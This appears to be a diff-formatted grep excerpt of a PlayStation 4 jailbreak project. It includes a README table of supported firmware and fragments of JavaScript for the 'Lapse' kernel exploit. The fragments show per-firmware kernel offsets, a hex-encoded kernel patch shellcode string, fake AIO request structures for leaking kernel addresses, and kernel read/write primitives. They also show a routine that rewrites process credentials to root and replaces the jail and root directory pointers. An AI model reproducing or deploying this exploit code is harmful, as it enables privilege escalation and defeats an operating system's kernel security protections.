@@ -1,0 +1,418 @@
+===== README.md =====
+e2d3e695b44b4432cc01a867b03aae5b967d2df11c77d7b09f7f53f7ebb8993a  vue-release/README.md
+  99 4935 vue-release/README.md
+6:KEX= Kernel Exploit
+7:| vue-after-free (Userland) | Lapse (KEX) | Poopsploit (KEX) |
+9:| 5.05–13.02                | 1.01–12.02  | ?.00–13.00       |
+13:This table indicates firmware versions for which the _current version_ of this repository provides a functional tested jailbreak for. 
+15:| 7.00-13.00 |
+17:* Userland exploit works 5.05 to 13.02 as is.
+37:  1. Jailbreak your console. 
+61:  * If you cannot access the savedata you do not have a Real PSN account or fake activated account, meaning that if you do not jailbreak first you cannot backup your saves.
+99:- AIOfix_network.elf by Gezine : https://github.com/Gezine/BD-JB-1250/blob/main/payloads/lapse/src/org/bdj/external/aiofix_network.c
+===== src_download0_kernel.js =====
+f21a0da97d0b2ef0d5cb8c542243b7325ca15bd5953816e5d12c65b774f75176  vue-release/src_download0_kernel.js
+  936 41524 vue-release/src_download0_kernel.js
+1:/** *** kernel_offset.js *****/
+3:// PS4 Kernel Offsets for Lapse exploit
+4:// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py
+6:// Kernel patch shellcode (hex strings) - patches security checks in kernel
+7:// These are executed via kexec after jailbreak to enable full functionality
+33:  '13.00': 'b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981847b6200c681cd0a0000ebc6812dd42b00ebc68171d42b00ebc681edd42b00ebc68131d52b00ebc681ddd62b00ebc6818ddb2b00ebc6815ddc2b00eb664489896f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68146153900ebc7814ec12f0000000000668981a4711b00c78158771b0090e93c01c781c0d83b004831c0c3c6817aa71f0037c6817da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3',
+36:// Mmap RWX patch offsets per firmware (for verification)
+37:// These are the offsets where 0x33 is patched to 0x37
+38:const kpatch_mmap_offsets = {
+59:  // TODO: add mmap offsets for 12.50, 12.52, 13.00
+110:  '13.00': '13.00',
+113:function get_mmap_patch_offsets (fw_version) {
+123:  return kpatch_mmap_offsets[lookup] || null
+135:// Get kernel patch shellcode for firmware version
+144:// Firmware-specific offsets for PS4
+146:offset_ps4_5_00 = {             // AND 5.01
+147:  EVF_OFFSET: 0X7B3ED4,
+154:offset_ps4_5_03 = {
+155:  EVF_OFFSET: 0X7B42E4,
+162:offset_ps4_5_05 = {             // AND 5.07
+163:  EVF_OFFSET: 0X7B42A4,
+170:offset_ps4_5_50 = {
+171:  EVF_OFFSET: 0X80EF12,
+178:offset_ps4_5_53 = {
+179:  EVF_OFFSET: 0X80EDE2,
+186:offset_ps4_5_55 = {
+187:  EVF_OFFSET: 0X80F482,
+194:offset_ps4_5_56 = {
+195:  EVF_OFFSET: 0X7C8971,
+202:offset_ps4_6_00 = {             // AND 6.02
+203:  EVF_OFFSET: 0X7C8971,
+210:offset_ps4_6_20 = {
+211:  EVF_OFFSET: 0X7C8E31,
+218:offset_ps4_6_50 = {
+219:  EVF_OFFSET: 0X7C6019,
+226:offset_ps4_6_51 = {
+227:  EVF_OFFSET: 0X7C6099,
+234:offset_ps4_6_70 = {             // AND 6.71, 6.72
+235:  EVF_OFFSET: 0X7C7829,
+242:offset_ps4_7_00 = {             // AND 7.01, 7.02
+243:  EVF_OFFSET: 0X7F92CB,
+250:offset_ps4_7_50 = {
+251:  EVF_OFFSET: 0X79A92E,
+258:offset_ps4_7_51 = {             // AND 7.55
+259:  EVF_OFFSET: 0X79A96E,
+266:offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+267:  EVF_OFFSET: 0X7EDCFF,
+274:offset_ps4_8_50 = {             // AND 8.52
+275:  EVF_OFFSET: 0X7DA91C,
+282:offset_ps4_9_00 = {
+283:  EVF_OFFSET: 0x7F6F27,
+286:  TARGET_ID_OFFSET: 0x221688D,
+293:offset_ps4_9_03 = {
+294:  EVF_OFFSET: 0x7F4CE7,
+297:  TARGET_ID_OFFSET: 0x221288D,
+303:offset_ps4_9_50 = {
+304:  EVF_OFFSET: 0x769A88,
+307:  TARGET_ID_OFFSET: 0x221A40D,
+313:offset_ps4_10_00 = {
+314:  EVF_OFFSET: 0x7B5133,
+317:  TARGET_ID_OFFSET: 0x1B9E08D,
+323:offset_ps4_10_50 = {
+324:  EVF_OFFSET: 0x7A7B14,
+327:  TARGET_ID_OFFSET: 0x1BE460D,
+333:offset_ps4_11_00 = {
+334:  EVF_OFFSET: 0x7FC26F,
+337:  TARGET_ID_OFFSET: 0x221C60D,
+343:offset_ps4_11_02 = {
+344:  EVF_OFFSET: 0x7FC22F,
+347:  TARGET_ID_OFFSET: 0x221C60D,
+353:offset_ps4_11_50 = {
+354:  EVF_OFFSET: 0x784318,
+357:  TARGET_ID_OFFSET: 0x21CC60D,
+363:offset_ps4_12_00 = {            // AND 12.02
+364:  EVF_OFFSET: 0x784798,
+367:  TARGET_ID_OFFSET: 0x21CC60D,
+373:offset_ps4_12_50 = {        // AND 12.52, 13.00
+374:  EVF_OFFSET: 0x0,        // Missing but not needed in netctrl
+377:  TARGET_ID_OFFSET: 0x0,  // Missing but not needed in netctrl
+383:// Map firmware versions to offset objects
+384:ps4_kernel_offset_list = {
+385:  '5.00': offset_ps4_5_00,
+386:  5.01: offset_ps4_5_00,
+387:  5.03: offset_ps4_5_03,
+388:  5.05: offset_ps4_5_05,
+389:  5.07: offset_ps4_5_05,
+390:  '5.50': offset_ps4_5_50,
+391:  5.53: offset_ps4_5_53,
+392:  5.55: offset_ps4_5_55,
+393:  5.56: offset_ps4_5_56,
+394:  '6.00': offset_ps4_6_00,
+395:  6.02: offset_ps4_6_00,
+396:  '6.20': offset_ps4_6_20,
+397:  '6.50': offset_ps4_6_50,
+398:  6.51: offset_ps4_6_51,
+399:  '6.70': offset_ps4_6_70,
+400:  6.71: offset_ps4_6_70,
+401:  6.72: offset_ps4_6_70,
+402:  '7.00': offset_ps4_7_00,
+403:  7.01: offset_ps4_7_00,
+404:  7.02: offset_ps4_7_00,
+405:  '7.50': offset_ps4_7_50,
+406:  7.51: offset_ps4_7_51,
+407:  7.55: offset_ps4_7_51,
+408:  '8.00': offset_ps4_8_00,
+409:  8.01: offset_ps4_8_00,
+410:  8.02: offset_ps4_8_00,
+411:  8.03: offset_ps4_8_00,
+412:  '8.50': offset_ps4_8_50,
+413:  8.52: offset_ps4_8_50,
+414:  '9.00': offset_ps4_9_00,
+415:  9.03: offset_ps4_9_03,
+416:  9.04: offset_ps4_9_03,
+417:  '9.50': offset_ps4_9_50,
+418:  9.51: offset_ps4_9_50,
+419:  '9.60': offset_ps4_9_50,
+420:  '10.00': offset_ps4_10_00,
+421:  10.01: offset_ps4_10_00,
+422:  '10.50': offset_ps4_10_50,
+423:  '10.70': offset_ps4_10_50,
+424:  10.71: offset_ps4_10_50,
+425:  '11.00': offset_ps4_11_00,
+426:  11.02: offset_ps4_11_02,
+427:  '11.50': offset_ps4_11_50,
+428:  11.52: offset_ps4_11_50,
+429:  '12.00': offset_ps4_12_00,
+430:  12.02: offset_ps4_12_00,
+431:  '12.50': offset_ps4_12_50,
+432:  12.51: offset_ps4_12_50,
+433:  '13.00': offset_ps4_12_50,
+436:kernel_offset = null // Global
+438:function get_kernel_offset (FW_VERSION) {
+439:  const fw_offsets = ps4_kernel_offset_list[FW_VERSION]
+441:  if (!fw_offsets) {
+445:  kernel_offset = fw_offsets
+447:  // PS4-specific proc structure offsets
+448:  kernel_offset.PROC_FD = 0x48
+449:  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
+450:  kernel_offset.PROC_VM_SPACE = 0x200
+451:  kernel_offset.PROC_UCRED = 0x40
+452:  kernel_offset.PROC_COMM = -1        // Found dynamically
+453:  kernel_offset.PROC_SYSENT = -1      // Found dynamically
+456:  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
+457:  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30
+460:  kernel_offset.VMSPACE_VM_PMAP = -1
+463:  kernel_offset.PMAP_CR3 = 0x28
+466:  kernel_offset.SO_PCB = 0x18
+467:  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120
+470:  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
+471:  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70
+473:  return kernel_offset
+476:// Global kernel object to save information
+477:// Also used in lapse.js
+479:kernel = {
+488:function is_kernel_rw_available () {
+489:  return kernel.read_buffer && kernel.write_buffer
+492:function check_kernel_rw () {
+493:  if (!is_kernel_rw_available()) {
+494:    throw new Error('kernel r/w is not available')
+498:kernel.read_byte = function (kaddr) {
+499:  const value = kernel.read_buffer(kaddr, 1)
+503:kernel.read_word = function (kaddr) {
+504:  const value = kernel.read_buffer(kaddr, 2)
+509:kernel.read_dword = function (kaddr) {
+510:  const value = kernel.read_buffer(kaddr, 4)
+519:kernel.read_qword = function (kaddr) {
+520:  const value = kernel.read_buffer(kaddr, 8)
+532:kernel.read_null_terminated_string = function (kaddr) {
+536:    const chunk = kernel.read_buffer(kaddr, 0x8)
+566:kernel.write_byte = function (dest, value) {
+569:  kernel.write_buffer(dest, buf)
+572:kernel.write_word = function (dest, value) {
+576:  kernel.write_buffer(dest, buf)
+579:kernel.write_dword = function (dest, value) {
+584:  kernel.write_buffer(dest, buf)
+587:kernel.write_qword = function (dest, value) {
+598:  kernel.write_buffer(dest, buf)
+640://      kernel.addr.curproc
+641://      kernel.addr.allproc
+642://      kernel.addr.base
+644:function jailbreak_shared (FW_VERSION) {
+645:  const OFFSET_P_UCRED = 0x40
+646:  const proc = kernel.addr.curproc
+653:  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD))
+654:  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))
+656:  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
+657:  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
+658:  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
+659:  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
+660:  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid
+662:  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
+663:  kernel.write_qword(ucred.add(0x30), prison0)
+665:  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
+666:  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))
+668:  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
+669:  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
+670:  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir
+682:  // === Apply kernel patches via kexec ===
+684:  debug('Applying kernel patches...')
+685:  const kpatch_result = apply_kernel_patches(FW_VERSION)
+===== src_download0_lapse.js =====
+b74a6beeb677fedfdd41c5dc32a77df49454efa3aa8bfe3dfa36069a2679d2b3  vue-release/src_download0_lapse.js
+  2933 100917 vue-release/src_download0_lapse.js
+1:/** *** kernel_offset.js *****/
+3:// PS4 Kernel Offsets for Lapse exploit
+4:// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py
+6:// Kernel patch shellcode (hex strings) - patches security checks in kernel
+7:// These are executed via kexec after jailbreak to enable full functionality
+34:// Mmap RWX patch offsets per firmware (for verification)
+35:// These are the offsets where 0x33 is patched to 0x37
+36:const kpatch_mmap_offsets = {
+107:function get_mmap_patch_offsets (fw_version) {
+117:  return kpatch_mmap_offsets[lookup] || null
+129:// Get kernel patch shellcode for firmware version
+138:// Firmware-specific offsets for PS4
+140:offset_ps4_5_00 = {             // AND 5.01
+141:  EVF_OFFSET: 0X7B3ED4,
+148:offset_ps4_5_03 = {
+149:  EVF_OFFSET: 0X7B42E4,
+156:offset_ps4_5_05 = {             // AND 5.07
+157:  EVF_OFFSET: 0X7B42A4,
+164:offset_ps4_5_50 = {
+165:  EVF_OFFSET: 0X80EF12,
+172:offset_ps4_5_53 = {
+173:  EVF_OFFSET: 0X80EDE2,
+180:offset_ps4_5_55 = {
+181:  EVF_OFFSET: 0X80F482,
+188:offset_ps4_5_56 = {
+189:  EVF_OFFSET: 0X7C8971,
+196:offset_ps4_6_00 = {             // AND 6.02
+197:  EVF_OFFSET: 0X7C8971,
+204:offset_ps4_6_20 = {
+205:  EVF_OFFSET: 0X7C8E31,
+212:offset_ps4_6_50 = {
+213:  EVF_OFFSET: 0X7C6019,
+220:offset_ps4_6_51 = {
+221:  EVF_OFFSET: 0X7C6099,
+228:offset_ps4_6_70 = {             // AND 6.71, 6.72
+229:  EVF_OFFSET: 0X7C7829,
+236:offset_ps4_7_00 = {             // AND 7.01, 7.02
+237:  EVF_OFFSET: 0X7F92CB,
+244:offset_ps4_7_50 = {
+245:  EVF_OFFSET: 0X79A92E,
+252:offset_ps4_7_51 = {             // AND 7.55
+253:  EVF_OFFSET: 0X79A96E,
+260:offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
+261:  EVF_OFFSET: 0X7EDCFF,
+268:offset_ps4_8_50 = {             // AND 8.52
+269:  EVF_OFFSET: 0X7DA91C,
+276:offset_ps4_9_00 = {
+277:  EVF_OFFSET: 0x7F6F27,
+280:  TARGET_ID_OFFSET: 0x221688D,
+285:offset_ps4_9_03 = {
+286:  EVF_OFFSET: 0x7F4CE7,
+289:  TARGET_ID_OFFSET: 0x221288D,
+294:offset_ps4_9_50 = {
+295:  EVF_OFFSET: 0x769A88,
+298:  TARGET_ID_OFFSET: 0x221A40D,
+303:offset_ps4_10_00 = {
+304:  EVF_OFFSET: 0x7B5133,
+307:  TARGET_ID_OFFSET: 0x1B9E08D,
+312:offset_ps4_10_50 = {
+313:  EVF_OFFSET: 0x7A7B14,
+316:  TARGET_ID_OFFSET: 0x1BE460D,
+321:offset_ps4_11_00 = {
+322:  EVF_OFFSET: 0x7FC26F,
+325:  TARGET_ID_OFFSET: 0x221C60D,
+330:offset_ps4_11_02 = {
+331:  EVF_OFFSET: 0x7FC22F,
+334:  TARGET_ID_OFFSET: 0x221C60D,
+339:offset_ps4_11_50 = {
+340:  EVF_OFFSET: 0x784318,
+343:  TARGET_ID_OFFSET: 0x21CC60D,
+348:offset_ps4_12_00 = {
+349:  EVF_OFFSET: 0x784798,
+352:  TARGET_ID_OFFSET: 0x21CC60D,
+357:// Map firmware versions to offset objects
+358:ps4_kernel_offset_list = {
+359:  '5.00': offset_ps4_5_00,
+360:  5.01: offset_ps4_5_00,
+361:  5.03: offset_ps4_5_03,
+362:  5.05: offset_ps4_5_05,
+363:  5.07: offset_ps4_5_05,
+364:  '5.50': offset_ps4_5_50,
+365:  5.53: offset_ps4_5_53,
+366:  5.55: offset_ps4_5_55,
+367:  5.56: offset_ps4_5_56,
+368:  '6.00': offset_ps4_6_00,
+369:  6.02: offset_ps4_6_00,
+370:  '6.20': offset_ps4_6_20,
+371:  '6.50': offset_ps4_6_50,
+372:  6.51: offset_ps4_6_51,
+373:  '6.70': offset_ps4_6_70,
+374:  6.71: offset_ps4_6_70,
+375:  6.72: offset_ps4_6_70,
+376:  '7.00': offset_ps4_7_00,
+377:  7.01: offset_ps4_7_00,
+378:  7.02: offset_ps4_7_00,
+379:  '7.50': offset_ps4_7_50,
+380:  7.51: offset_ps4_7_51,
+381:  7.55: offset_ps4_7_51,
+382:  '8.00': offset_ps4_8_00,
+383:  8.01: offset_ps4_8_00,
+384:  8.02: offset_ps4_8_00,
+385:  8.03: offset_ps4_8_00,
+386:  '8.50': offset_ps4_8_50,
+387:  8.52: offset_ps4_8_50,
+388:  '9.00': offset_ps4_9_00,
+389:  9.03: offset_ps4_9_03,
+390:  9.04: offset_ps4_9_03,
+391:  '9.50': offset_ps4_9_50,
+392:  9.51: offset_ps4_9_50,
+393:  '9.60': offset_ps4_9_50,
+394:  '10.00': offset_ps4_10_00,
+395:  10.01: offset_ps4_10_00,
+396:  '10.50': offset_ps4_10_50,
+397:  '10.70': offset_ps4_10_50,
+398:  10.71: offset_ps4_10_50,
+399:  '11.00': offset_ps4_11_00,
+400:  11.02: offset_ps4_11_02,
+401:  '11.50': offset_ps4_11_50,
+402:  11.52: offset_ps4_11_50,
+403:  '12.00': offset_ps4_12_00,
+404:  12.02: offset_ps4_12_00,
+407:kernel_offset = null
+409:function get_kernel_offset (FW_VERSION) {
+410:  const fw_offsets = ps4_kernel_offset_list[FW_VERSION]
+412:  if (!fw_offsets) {
+416:  kernel_offset = fw_offsets
+418:  // PS4-specific proc structure offsets
+419:  kernel_offset.PROC_FD = 0x48
+420:  kernel_offset.PROC_PID = 0xB0       // PS4 = 0xB0, PS5 = 0xBC
+421:  kernel_offset.PROC_VM_SPACE = 0x200
+422:  kernel_offset.PROC_UCRED = 0x40
+423:  kernel_offset.PROC_COMM = -1        // Found dynamically
+424:  kernel_offset.PROC_SYSENT = -1      // Found dynamically
+427:  kernel_offset.FILEDESC_OFILES = 0x0  // PS4 = 0x0, PS5 = 0x8
+428:  kernel_offset.SIZEOF_OFILES = 0x8    // PS4 = 0x8, PS5 = 0x30
+431:  kernel_offset.VMSPACE_VM_PMAP = -1
+434:  kernel_offset.PMAP_CR3 = 0x28
+437:  kernel_offset.SO_PCB = 0x18
+438:  kernel_offset.INPCB_PKTOPTS = 0x118  // PS4 = 0x118, PS5 = 0x120
+441:  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
+442:  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70
+444:  return kernel_offset
+468:LIBKERNEL_HANDLE = 0x2001
+491:SCE_KERNEL_ERROR_ESRCH = 0x80020003
+1066:    const scratch = sce_errs.add(8)  // Use offset for scratch space
+1078:    if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
+1167:  const marker_offset = 4
+1176:        write32(buf.add(marker_offset), i)
+1185:        const marker = Number(read32(buf.add(marker_offset)))
+1238:      const offset = i * 0x28
+1239:      write32(block_reqs.add(offset).add(0x08), 1)
+1240:      write32(block_reqs.add(offset).add(0x20), block_fd)
+1467:function leak_kernel_addrs (sd_pair, sds) {
+1527:  const kernel_addr = read64(buf.add(0x28))
+1528:  log('"evf cv" string addr: ' + hex(kernel_addr))
+1531:  log('Kernel buffer addr: ' + hex(kbuf_addr))
+1533:  const wbufsz = 0x80
+1534:  const wbuf = malloc(wbufsz)
+1535:  const rsize = build_rthdr(wbuf, wbufsz)
+1537:  const reqs3_offset = 0x10
+1540:  write32(wbuf.add(reqs3_offset + 0), 1)                  // .ar3_num_reqs
+1541:  write32(wbuf.add(reqs3_offset + 4), 0)                  // .ar3_reqs_left
+1542:  write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE) // .ar3_state
+1543:  write8(wbuf.add(reqs3_offset + 0xc), 0)                // .ar3_done
+1544:  write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000)       // .ar3_lock.lock_object.lo_flags
+1545:  write64(wbuf.add(reqs3_offset + 0x38), 1)               // .ar3_lock.lk_lock = LK_UNLOCKED
+1576:      const offset = off
+1578:      if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
+1583:        const marker = read32(buf.add(offset + 4))
+1586:          sd_idx = Number(read32(buf.add(offset + 8)))
+1608:  log('reqs2 offset: ' + hex(reqs2_off))
+1609:  log('fake reqs3 offset: ' + hex(fake_reqs3_off))
+1625:  const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset)
+1666:  log('Kernel addresses leaked successfully!')
+1671:    kernel_addr,
+1682:kernel = {
+1690:kernel.read_byte = function (kaddr) {
+1691:  const value = kernel.read_buffer(kaddr, 1)
+1695:kernel.read_word = function (kaddr) {
+1696:  const value = kernel.read_buffer(kaddr, 2)
+1701:kernel.read_dword = function (kaddr) {
+1702:  const value = kernel.read_buffer(kaddr, 4)
+1711:kernel.read_qword = function (kaddr) {
+1712:  const value = kernel.read_buffer(kaddr, 8)
+1724:kernel.read_null_terminated_string = function (kaddr) {
+1728:    const chunk = kernel.read_buffer(kaddr, 0x8)
+1758:kernel.write_byte = function (dest, value) {
+1761:  kernel.write_buffer(dest, buf)
+1764:kernel.write_word = function (dest, value) {
+1768:  kernel.write_buffer(dest, buf)
+1771:kernel.write_dword = function (dest, value) {
+1776:  kernel.write_buffer(dest, buf)
+1779:kernel.write_qword = function (dest, value) {
+1790:  kernel.write_buffer(dest, buf)
+1793:// IPv6 kernel r/w primitive
+1794:ipv6_kernel_rw = {
+1797:  kread8: null,
+1798:  kwrite8: null
+1801:ipv6_kernel_rw.init = function (ofiles, kread8, kwrite8) {
+1802:  ipv6_kernel_rw.ofiles = ofiles
